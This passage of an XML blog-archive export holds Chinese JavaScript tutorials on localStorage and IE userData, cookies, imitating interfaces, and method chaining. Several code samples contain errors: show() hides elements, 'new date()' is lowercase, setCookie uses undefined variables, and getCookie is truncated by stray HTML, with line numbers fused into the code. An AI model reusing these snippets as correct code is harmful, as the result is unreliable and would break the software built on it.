supports the storage events. 上面一串*&lt;%￥…是来自wiki的说明，跟localStorage一起的还有sessionStorage，这里就只说说localStorage。上文大意（英语水平低就是可怜）：网页储存被W3C标准化，原来本属于HTML5标准的一部分，现在已经被独立出来了。它适用于IE 8+，FF 2+，Safari 4+，chrome 4+， Opera 10.50+。 P.S.：sessionStorage用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此sessionStorage不是一种持久化的本地存储，仅仅是会话级别的存储。 标准建议对于每个domain，localStorage大小为5M，达到限制时浏览器可以去问用户是否允许增加存储空间。 &nbsp; 这是网友的对\浏览器具体能保存多少个字符”的一个测试。测试结果： 对英文字符和中文字符来说，测试结果并无变化，所以存储格式可能为UTF16。 以下为测试数据(key有5个字符): IE 9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &gt;&nbsp;4999995 + 5 = 5000000 firefox&nbsp;8.0.2&nbsp;&gt;&nbsp;5242875 + 5 = 5242880 chrome &nbsp;16.0 &nbsp;&gt;&nbsp;2621435 + 5 = 2621440 safari &nbsp;5.1 &nbsp;&nbsp;&gt;&nbsp;2621435&nbsp;+ 5 = 2621440 opera &nbsp; 11.60&nbsp;&gt;&nbsp;1966068&nbsp;+ 5 = 1966073&nbsp;&nbsp;Grammar [语法介绍] 1.userData1234XML &lt;prefix: customtag=&quot;&quot; id=&quot;sID&quot;&gt;HTML &lt;element id=&quot;sID&quot;&gt;Scripting object .style.behavior = &quot;url(&apos;#default#userData&apos;)&quot;object .addBehavior (&quot;#default#userData&quot;)&lt;/prefix:&gt; 上面介绍了几种语言中userData的用法，当然这也是从MSDN拿过来的（呵呵，真心好用）。那这里我们重点放在前端常用的位置上，也就是标红了的HTML中。 1）属性: expires &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;设置或者获取 userData behavior 保存数据的失效日期。 XMLDocument &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;获取 XML 的引用。 2）方法: getAttribute() &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;获取指定的属性值。 load(object) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;从 userData &nbsp;存储区载入存储的对象数据。 removeAttribute() &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;移除对象的指定属性。 save(object) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 将对象数据存储到一个 userData 存储区。 setAttribute() &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 设置指定的属性值。 具体如何实现，请转到最下面封装的一个对象中~ 2.localStorage 1）方法： localStorage.getItem(key) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;获取指定key本地存储的值 localStorage.setItem(key,value) &nbsp;将value存储到key字段 localStorage.removeItem(key) &nbsp; &nbsp;删除指定key本地存储的值Pacaking [对象封装] of userDate&&localStorage1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556localData = &#123; hname:location.hostname?location.hostname:&apos;localStatus&apos;, isLocalStorage:window.localStorage?true:false, dataDom:null, initDom:function()&#123; //初始化userData if(!this.dataDom)&#123; try&#123; this.dataDom = document.createElement(&apos;input&apos;);//这里使用hidden的input元素 this.dataDom.type = &apos;hidden&apos;; this.dataDom.style.display = &quot;none&quot;; this.dataDom.addBehavior(&apos;#default#userData&apos;);//这是userData的语法 document.body.appendChild(this.dataDom); var exDate = new Date(); exDate = exDate.getDate()+30; this.dataDom.expires = exDate.toUTCString();//设定过期时间 &#125;catch(ex)&#123; return false; &#125; &#125; return true; &#125;, set:function(key,value)&#123; if(this.isLocalStorage)&#123; window.localStorage.setItem(key,value); &#125;else&#123; if(this.initDom())&#123; this.dataDom.load(this.hname); this.dataDom.setAttribute(key,value); this.dataDom.save(this.hname) &#125; &#125; &#125;, get:function(key)&#123; if(this.isLocalStorage)&#123; return window.localStorage.getItem(key); &#125;else&#123; if(this.initDom())&#123; this.dataDom.load(this.hname); return this.dataDom.getAttribute(key); &#125; &#125; &#125;, remove:function(key)&#123; if(this.isLocalStorage)&#123; localStorage.removeItem(key); &#125;else&#123; if(this.initDom())&#123; this.dataDom.load(this.hname); this.dataDom.removeAttribute(key); this.dataDom.save(this.hname) &#125; &#125; &#125; &#125; Usage [使用说明] 1.初始化 1localData.initDom(); 2.设置 key/value 1localData.set(key, value); 3.获取 value 1localData.get(key); 4.删除 1localData.remove(key); Attention [注意事项] 1.localStorage用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。 2.出于安全原因，只有在同一个目录和相同的协议下才能进行持久化存储。数据是未加密的，建议你不要保存过于隐私的信息。下文将对web离线作具体介绍。 Related blog [相关博文] JavaScript本地储存（1）：cookie在前端&nbsp; Javascript本地储存（3）：离线web应用 Reference [参考资料] 1.wiki 2.MSDN 3.BeiYuu博客 4.网友]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript本地储存（1）：cookie在前端]]></title>
    <url>%2Fblog%2F2013%2F03%2F27%2F2013-03-27-cb-javascript-cookie%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 以前心里总是默念着这句：\知道资源在哪儿就是成功的一半”。对于很多知识的学习，好像也一直停留在知道它在哪儿的地步，看来现在需要有所改变了！ 那就从cookie开始吧~ Cookie（复数形态Cookies），中文名称为小型文本文件或小甜饼，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端（Client Side）上的数据（通常经过加密）。定义于RFC2109（已废弃），最新取代的规范是RFC2965。Clasification [分类] 说到底，cookie就是保存在客户端的一段字符串（注意：不是数组）。 cookie可以手动设置，也可以由服务器产生，当客户端（浏览器）向服务器发送请求，服务器会反馈一些信息给客户端，这些信息的key/value值被浏览器作为文件保存在客户端特定的文件夹中。 1.内存Cookie 内存Cookie由浏览器维护，保存在内存中，浏览器关闭后就消失了，其存在时间是短暂的。 2.磁盘Cookie&nbsp; &nbsp;硬盘Cookie保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，硬盘Cookie不会被删除，其存在时间是长期的。 Arguments [参数] &nbsp;属&nbsp; 性&nbsp; 名描&nbsp;&nbsp;&nbsp; 述String name该Cookie的名称。Cookie一旦创建，名称便不可更改Object value该Cookie的值。如果值为Unicode字符，需要为字符编码。如果值为二进制数据，则需要使用BASE64编码int maxAge该Cookie失效的时间，单位秒。如果为正数，则该Cookie在maxAge秒之后失效。如果为负数，该Cookie为临时Cookie，关闭浏览器即失效，浏览器也不会以任何形式保存该Cookie。如果为0，表示删除该Cookie。默认为–1boolean secure该Cookie是否仅被使用安全协议传输。安全协议。安全协议有HTTPS，SSL等，在网络上传输数据之前先将数据加密。默认为falseString path该Cookie的使用路径。如果设置为\/sessionWeb/“，则只有contextPath为\/sessionWeb”的程序可以访问该Cookie。如果设置为\/“，则本域名下contextPath都可以访问该Cookie。注意最后一个字符必须为\/“String domain可以访问该Cookie的域名。如果设置为.google.com”，则所有以\google.com”结尾的域名都可以访问该Cookie。注意第一个字符必须为.“String comment该Cookie的用处说明。浏览器显示Cookie信息的时候显示该说明int version该Cookie使用的版本号。0表示遵循Netscape的Cookie规范，1表示遵循W3C的RFC 2109规范 Detail [参数详解] 1。key/value 11 document.cookie = &apos;username=木子Vs立青&apos; 很简单吧，cookie是document的一个属性，在控制台，console.log(document.cookie)可以看到该域名下的cookie值。设置方式就是key=value. 如何已经存在了username这个key，再次如上操作就是修改value值了。 2.maxAge 1234561 var date = new Date();23 date.setDate(date.getDate()+30);4 date.toGMTString();56 document.cookie = &quot;name=value;expires=date&quot; expires这个参数是用来设置cookie有效期的，如果将expires设置成一个过去的时间（相对本机系统时间），相应的cookie就被删除，当然也可以手动来删除cookie~ 上面给出的例子是以天为单位计算的，如果要改成其他的计时方式，可以修改第三行date.setDate(date.getDate()+30)，为30天。比如要改成按小时计算：date.setHours(date.getHours()+30)，为30小时。 3.path 11 document.cookie = &quot;name=value;expires=date;path=path&quot; &nbsp; 这里的path如何理解？比如在http://www.cnblogs.com/hustskyking/下创建一个cookie（即path=/hustskyking/），那么在http://www.cnblogs.com/hustskyking/下所有子目录都是可以访问这个cookie的；再比如path=/，意思就是在http://www.cnblogs.com/下的任何子目录都是访问到这个cookie的。 4.domain 11 document.cookie = &quot;name=value;path=path;expires=date;domain=domain&quot; 这里要说的是同域访问，比如在a.example.com和b.example.com下共享c.example.com下的cookie文件，只需如此这般… 11 document.cookie = &quot;name=value;path=path;expires=date;domain=example.com&quot; 你应该懂了~ 5.secure&nbsp; 我们知道在网络中建立连接传输数据有两种常见的方式，一个钟是http，另一种是https，后者是加密传输。大家从上面也可以看出，cookie很容易被窃取，通过下面这个方式可以为cookie加一把安全锁。 11 document.cookie = &quot;username=木子Vs立青;secure&quot; 加了secure（默认值为空），之后，cookie提交到服务器时使用的是https传输。当然这只是加了一层防护，不等于我爱罗的绝对防御~ Attention [注意事项] 1.value值保护 11 document.cookie = name + &quot;=&quot;+ escape (value); 我们通常会用escape将value进行编码，取回的时候用unescape()函数就行了。 2.重要信息就不要放到cookie值中了~ Class [封装cookie方法的类] 1、创建Cookie对象 121 //因为是作为类名或者命名空间的使用，所以和Math对象类似，这里使用Cookie来表示该对象2 var Cookie = new Object(); 2、实现设置Cookie的方法 123456789101112131415161718 1 //name是要设置cookie的名称；value是设置cookie的值，option包括了其它选项，是一个对象作为参数 2 Cookie.setCookie = function(name, value, option) &#123; 3 //用于存储赋值给document.cookie的cookie格式字符串 4 var str = name+&quot;=&quot;+escape(value); 5 if(option) &#123; 6 //如果设置了过期时间 7 if(option.expireDays) &#123; 8 var date = new date(); 9 var ms = option.expireDays*24*3600*1000;10 date.setTime(date.getTime()+ms);11 str += &quot;; expires=&quot;+date.toGMTString();12 &#125;13 if(option.path) str += &quot;; path=&quot;+path;//设置访问路径14 if(option.domain) str += &quot;; domain=&quot;+domain;//设置访问主机15 if(option.secure) str += &quot;; true&quot;;//设置安全性16 &#125;17 document.cookie = str;18 &#125; 3、实现取Cookie的方法 123456 1 //name是指定cookie的名称，从而根据名称返回相应的值 2 Cookie.getCookie = function(name) &#123; 3 var cookieArray = document.cookie.split(&quot;; &quot;);//得到分割的cookie名值对 4 var cookie = new Object(); 5 for(var i=0; i&lt;p&gt;&lt;strong&gt;&lt;span&gt; 4、实现删除Cookie的方法&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt; 1 //name是指定cookie的名称，从而根据这个名称删除相应的cookie。在实现中，删除cookie是通过调用setCookie来完成的，将option的expireDays属性指定为负数即可 2 Cookie.deleteCookie = function(name) { 3 this.setCookie(name, “”, {expireDays:-1});//将过期时间设置为过去来删除一个cookie 4 } 5 //通过下面的代码，整个Cookie对象创建完毕后，可以将其放到一个大括号中来定义： 6 var Cookie = { 7 setCookie:function(){}, 8 getCookie:function(){}, 9 deleteCookie:function(){}10 }1112 //通过这种形式，可以让Cookie的功能更加清晰，它作为一个全局对象，大大方便了对Cookie的操作13 Cookie.setCookie(“user”, “terry”);14 Cookie.deleteCookie(“user”); ` Substitution [cookie的替代品] cookie 是有大小限制的，每个 cookie 所存放的数据不能超过4kb，如果 cookie 字符串的长度超过4kb，则该属性将返回空字符串。 如果我们需要在客户端储存比较大容量的数据，怎么办？选择cookie肯定是不明智的，下次会给大家详细说明userData和localStorage。 userData(windows+IE平台):&nbsp;128Kb localStorage(现代浏览器):&nbsp;&nbsp;5M &nbsp;Related blog [相关博文] JavaScript本地储存（2）：userData和localStorage Javascript本地储存（3）：离线web应用 Reference [参考资料] 1.百度文库 2.wiki 3.聂微东博客 4.alixixi]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汤姆大叔的JS系列文章，放在自己家里好找]]></title>
    <url>%2Fblog%2F2013%2F03%2F27%2F2013-03-27-%E6%B1%A4%E5%A7%86%E5%A4%A7%E5%8F%94%E7%9A%84JS%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0%EF%BC%8C%E6%94%BE%E5%9C%A8%E8%87%AA%E5%B7%B1%E5%AE%B6%E9%87%8C%E5%A5%BD%E6%89%BE%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 汤姆大叔文章列表 深入理解JavaScript系列（1）：编写高质量JavaScript代码的基本要点深入理解JavaScript系列（2）：揭秘命名函数表达式深入理解JavaScript系列（3）：全面解析Module模式深入理解JavaScript系列（4）：立即调用的函数表达式深入理解JavaScript系列（5）：强大的原型和原型链深入理解JavaScript系列（6）：S.O.L.I.D五大原则之单一职责SRP深入理解JavaScript系列（7）：S.O.L.I.D五大原则之开闭原则OCP深入理解JavaScript系列（8）：S.O.L.I.D五大原则之里氏替换原则LSPS.O.L.I.D需要加强深入理解JavaScript系列（9）：根本没有\JSON对象”这回事！深入理解JavaScript系列（10）：JavaScript核心（晋级高手必读篇）深入理解JavaScript系列（11）：执行上下文（Execution Contexts）深入理解JavaScript系列（12）：变量对象（Variable Object）深入理解JavaScript系列（13）：This? Yes, this!还需加强。深入理解JavaScript系列（14）：作用域链(Scope Chain)还需加强。深入理解JavaScript系列（15）：函数（Functions）深入理解JavaScript系列（16）：闭包（Closures）深入理解JavaScript系列（17）：面向对象编程之一般理论深入理解JavaScript系列（18）：面向对象编程之ECMAScript实现深入理解JavaScript系列（19）：求值策略深入理解JavaScript系列（20）：《你真懂JavaScript吗？》答案详解深入理解JavaScript系列（21）：S.O.L.I.D五大原则之接口隔离原则ISP深入理解JavaScript系列（22）：S.O.L.I.D五大原则之依赖倒置原则DIP深入理解JavaScript系列（23）：JavaScript与DOM（上）&mdash;&mdash;也适用于新手深入理解JavaScript系列（24）：JavaScript与DOM（下）深入理解JavaScript系列（25）：设计模式之单例模式深入理解JavaScript系列（26）：设计模式之构造函数模式深入理解JavaScript系列（27）：设计模式之建造者模式深入理解JavaScript系列（28）：设计模式之工厂模式深入理解JavaScript系列（29）：设计模式之装饰者模式深入理解JavaScript系列（30）：设计模式之外观模式深入理解JavaScript系列（31）：设计模式之代理模式深入理解JavaScript系列（32）：设计模式之观察者模式深入理解JavaScript系列（33）：设计模式之策略模式深入理解JavaScript系列（34）：设计模式之命令模式深入理解JavaScript系列（35）：设计模式之迭代器模式深入理解JavaScript系列（36）：设计模式之中介者模式深入理解JavaScript系列（37）：设计模式之享元模式深入理解JavaScript系列（38）：设计模式之职责链模式深入理解JavaScript系列（39）：设计模式之适配器模式深入理解JavaScript系列（40）：设计模式之组合模式深入理解JavaScript系列（41）：设计模式之模板方法深入理解JavaScript系列（42）：设计模式之原型模式深入理解JavaScript系列（43）：设计模式之状态模式深入理解JavaScript系列（44）：设计模式之桥接模式深入理解JavaScript系列（45）：代码复用模式（避免篇）深入理解JavaScript系列（46）：代码复用模式（推荐篇）深入理解JavaScript系列（47）：对象创建模式（上篇）深入理解JavaScript系列（48）：对象创建模式（下篇）深入理解JavaScript系列（49）：Function模式（上篇）深入理解JavaScript系列（50）：Function模式（下篇）深入理解JavaScript系列（结局篇） 原文地址：http://www.cnblogs.com/TomXu/archive/2011/12/15/2288411.html]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在Javascript中模仿接口（一）]]></title>
    <url>%2Fblog%2F2012%2F09%2F22%2F2012-09-22-%E5%9C%A8Javascript%E4%B8%AD%E6%A8%A1%E4%BB%BF%E6%8E%A5%E5%8F%A3%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. &nbsp;本文从ITeye导入 在JavaScript中模仿接口&mdash;&mdash;本文摘自《JavaScript设计模式》 一、用注释描述接口 12345678910111213141516171819202122232425262728293031/* interface Composite &#123; function add(child); function remove(child); function getChild(index); &#125; interface FormItem &#123; function save(); &#125;*/var CompositeForm = function(id, method, action)&#123; //......&#125;;//Implement the Composite interface.CompositeForm.prototype.add = function(child)&#123; //......&#125;CompositeForm.prototype.remove = function(child)&#123; //......&#125;CompositeForm.prototype.getChild = function(index)&#123; //......&#125;///Implement the FormItem interface.CompositeForm.prototype.save = function()&#123; //......&#125; 这种模仿并不是很好，他们有为确保CompositeForm真正实现正确的方法集而进行检查，也不会跑出错误以高质程序员程序中的问题。 二、用属性检查模仿接口 12345678910111213141516171819202122232425262728293031323334353637383940414243/* interface Composite &#123; function add(child); function remove(child); function getChild(index); &#125; interface FormItem &#123; function save(); &#125; */ var CompositeForm = function(id, method, action)&#123; this.implementsInterfaces = [&apos;Composite&apos;, &apos;FormItem&apos;]; //...... &#125; function addForm(formInstance)&#123; if(!implements(formInstance, &apos;Composite&apos;, &apos;FormItem&apos;))&#123; throw new Error(&quot;Object does not implement a required interface&quot;); &#125; //...... &#125; //The implements function, which checks to see if an object delcares that it //implements the required interfaces. function implements(object)&#123; for(var i = 0; i &lt; arguments.length; i++)&#123; var interfaceName = arguments[i]; var interfaceFound = false; for(var j = 0; j &lt; object.implementsInterface.length; j++)&#123; if(object.implementsInterface[j] == interfaceName)&#123; interfaceFound = true; break; &#125; &#125; if(!interfaceFound)&#123; return false; //An interface was not found. &#125; &#125; return true; //All interface were found. &#125; 在这个例子中，CompositeForm宣传自己实现了Composite和FormItem这两个接口，其做法是吧这链各个接口的名称加入一个名为implement上Interfaces的数组。 三、用鸭式辨型模仿接口 1234567891011121314//Interfacesvar composite = new Interface(&apos;Composite&apos;, [&apos;add&apos;, &apos;remove&apos;, &apos;getChild&apos;]);var FormItem = new Interface(&apos;FormItem&apos;, [&apos;save&apos;]);//CompositeForm classvar CompositeForm = function(id, method, action)&#123; //........&#125;function addForm(formInstancd)&#123; ensureImplements(formInstance, Composite, FormItem); //........&#125; &nbsp;待续……]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何设计一个支持方法链式调用的JavaScript库]]></title>
    <url>%2Fblog%2F2012%2F09%2F18%2F2012-09-18-%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E6%94%AF%E6%8C%81%E6%96%B9%E6%B3%95%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E7%9A%84JavaScript%E5%BA%93%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 本文从ITeye导入 可以先了解下&nbsp;javascript链式调用的实现方式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103//设计一个支持方法链式调用的JavaScript库/* 常见于大多数JavaScript库中的特性 &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash; 特性 | 说明 &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash; 事件 | 添加和删除事件监听器，对时间对象进行规范内化处理 DOM | 类名管理，样式管理 Ajax | 多XMLHttpRequest进行规范化处理 &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash; 注：可以对私有的_$构造函数进行扩充*/Function.prototype.method = function(name, fn)&#123; this.prototype[name] = fn; return this;&#125;;(function()&#123; function _$(els)&#123; this.element = []; for(var i = 0, len = els.length; i &lt; len; i++)&#123; var element = els[i]; if(typeof element === &apos;string&apos;)&#123; element = document.getElementById(element); &#125; this.element.push(element); &#125; return this; &#125; /* Events * addEvent */ _$.method(&apos;addEvent&apos;, function(type, fn)&#123; var add = function(el)&#123; if(window.addEventListener)&#123; el.addEventListener(type, fn, false); &#125;else if(window.attachEvent)&#123; el.attachEvent(&apos;on&apos; + type, fn); &#125; this.each(function(el)&#123; add(el); &#125;); &#125;). /* otherFun * each * setStyle * show */ method(&apos;otherFun&apos;, function(fn)&#123; for(var i = 0, len = this.element.length; i &lt; len; i++)&#123; fn.call(this, this.element[i]); &#125; return this; &#125;). method(&apos;setStyle&apos;, function(prop, val)&#123; this.each(function(el)&#123; el.style[prop] = val; &#125;); return this; &#125;). method(&apos;show&apos;, function()&#123; var that = this; this.each(function(el)&#123; that.setStyle(&apos;display&apos;, &apos;none&apos;); &#125;); return this; &#125;); window.installHelper = function(scope, interface)&#123; scope[interface] = function()&#123; return new _$(arguments); &#125;; &#125;;&#125;)();/* //处理库中$的冲突问题 用户可能会这样使用： installHelper(window, &quot;$&quot;); $(&apos;example&apos;).show(); 也可以将功能添加到实现定义好的命名空间对象中： window.com = window.com || &#123;&#125;; com.example = com.example || &#123;&#125;; com.example.util = com.example.util || &#123;&#125;; installHelper(com.example.util, &apos;$&apos;); (function()&#123; var get = com.example.util.get; get(&apos;example&apos;).show(); &#125;)();*/]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript链式调用的实现方式]]></title>
    <url>%2Fblog%2F2012%2F09%2F18%2F2012-09-18-javascript%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 本文从ITeye导入&nbsp; 在我们所用到的库中，可以看到很多诸如 12345$(window).addEvent(&apos;load&apos;, function()&#123; $(&apos;test&apos;).show().setStyle(&apos;color&apos;, &apos;red&apos;).addEvent(&apos;click&apos;, function(e)&#123; $(this).setStyle(&apos;color&apos;, &apos;yellow&apos;); &#125;);&#125;); &nbsp;的链式调用，那么这样的链式结构是怎么实现的呢，下面我们利用代码来探讨一番： &nbsp;先分解下，我们队$函数已经很熟悉了，他通常返回一个HTML元素或者HTML元素的集合，如下所示： 1234567891011function $()&#123; var elements = []; for(var i = 0, len = arguments.length; i &lt; len; i++)&#123; var element = els[i]; if(typeof element === &apos;string&apos;)&#123; element = document.getElementById(element); &#125; elements.push(element); &#125; return elements;&#125; &nbsp;但是，如果把这个函数改造为一个构造器，把那些元素作为数组保存在一个实例属性中，并让所有定义在构造器函数的prototype属性所指对象中的方法都返回用以调用放方法的那个实例的引用，那么他就具有了进行链式调用的能力。 先别说的太远，我们首先需要把这个$函数改为一个工厂函数，他负责创建支持链式调用的对象。 1234567891011121314151617(function()&#123; function _$(els)&#123; this.element = []; for(var i = 0, len = els.length; i &lt; len; i++)&#123; var element = els[i]; if(typeof element === &apos;string&apos;)&#123; element = document.getElementById(element); &#125; this.element.push(element); &#125; return this; &#125; window.$ = function()&#123; return new _$(arguments); &#125;&#125;)(); 由于所有对象都会继承其原型对象的属性和方法，所以我们可以让定义原型对象中的那几个方法都返回用以调用方法的实例对象的引用，这样既可以对那些方法进行链式调用，想好这一点，我们现在就动手在_$这个私用构造函数的prototype对象那个中添加方法，以便实现链式调用。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455(function()&#123; function _$(els)&#123; this.element = []; for(var i = 0, len = els.length; i &lt; len; i++)&#123; var element = els[i]; if(typeof element === &apos;string&apos;)&#123; element = document.getElementById(element); &#125; this.element.push(element); &#125; return this; &#125; _$.prototype = &#123; each: function(fn)&#123; for(var i = 0, len = this.element.length; i &lt; len; i++)&#123; fn.call(this, this.element[i]); &#125; return this; &#125;, setStyle: function(prop, val)&#123; this.each(function(el)&#123; el.style[prop] = val; &#125;); return this; &#125;, show: function()&#123; var that = this; this.each(function(el)&#123; that.setStyle(&apos;display&apos;, &apos;none&apos;); &#125;); return this; &#125;, addEvent: function(type, fn)&#123; var add = function(el)&#123; if(window.addEventListener)&#123; el.addEventListener(type, fn, false); &#125;else if(window.attachEvent)&#123; el.attachEvent(&apos;on&apos; + type, fn); &#125; &#125;; this.each(function(el)&#123; add(el); &#125;); &#125; &#125;; window.$ = function()&#123; return new _$(arguments); &#125;&#125;)(); &nbsp;看看该类每个方法的最后一行，你会发现他们都是以”return this;”结束，这样将用以调用方法的对象传给调用链上的下一个方法。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript的灵活性]]></title>
    <url>%2Fblog%2F2012%2F09%2F17%2F2012-09-17-javascript%E7%9A%84%E7%81%B5%E6%B4%BB%E6%80%A7%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 如果你偏爱过程式编程，你可以这样： 1234567/*Start and stop animations using functions.*/function startAnination() &#123; ....&#125;function stopAnination()&#123; ....&#125; 这种做法很简单，但是你无法创建可以保存状态并且具有一些仅对其内部状态进行操作的方法的动画对象。下面的代码定义了一个类，你可以用它创建这种对象： 12345678910111213141516/*Anim class.*/ var Anim = function()&#123; .... &#125;; Anim.prototype.start = function()&#123; .... &#125;; Anim.prototype.stop = function()&#123; .... &#125;; /*Usage.*/ var myAnim = new Anim(); myAnim.start(); .... myAnim.stop(); 上述代码定义了一个名为Anim的类，并把两个方法赋给该类的prototype的属性。如果你更喜欢把类的定义封装在一条声明中，则可以改用下面的代码： 123456789101112/*Anim class, with a slightly different syntax for declaring methods*/var Anim = function()&#123; .... &#125;; Anim.prototype = &#123; start : function()&#123; .... &#125;; stop : function()&#123; .... &#125;;&#125;; 这在传统的面向对象程序员看来肯呢过更眼熟一点，他们习惯于看到类的方法声明内嵌在类的声明之中。要是你以前用过这样的编程风格，可能想尝试下下面的是里。 123456789101112131415/*Add method to the Function object that can be used to declare methods*/Function.prototype.methed = function(name, fn)&#123; this.prototype[name] = fn;&#125;;/*Anim class, with ,methods created using a conbenience ,method.*/var Anim = function()&#123; ....&#125;;Anim.method(&apos;start&apos;, function()&#123; .....&#125;);Anim.method(&apos;stop&apos;, function()&#123; ....&#125;); Function.protytype.method用于为类添加新方法。他有两个参数，第一个是字符串，表示新方法的名称；第二个是用作新方法的函数。 你可以进一步修改Function.prototype.method, 使其可被链式调用。这只需要在他返回this值即可： 1234567891011121314151617/*This version alllows the calls to be chained.*/Function.prototype.method = function(name, fn)&#123; this.prototype[name] = fn; return this;&#125;;/*Anim class, with methods created using a convenience and chaining.*/var Anim = 